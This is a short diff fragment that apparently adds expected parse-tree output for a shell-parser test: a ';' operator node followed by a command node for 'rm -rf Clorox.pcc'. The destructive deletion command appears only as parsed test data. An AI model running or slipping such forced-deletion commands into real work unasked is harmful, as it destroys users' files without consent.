+  OperatorNode(lineno=12, op=';', pos=(2118, 2119)),
+  CommandNode(lineno=12, pos=(2120, 2137), parts=[
+    WordNode(lineno=12, pos=(2120, 2122), word='rm'),
+    WordNode(lineno=12, pos=(2123, 2126), word='-rf'),
+    WordNode(lineno=12, pos=(2127, 2137), word='Clorox.pcc'),
+  ]),
+])
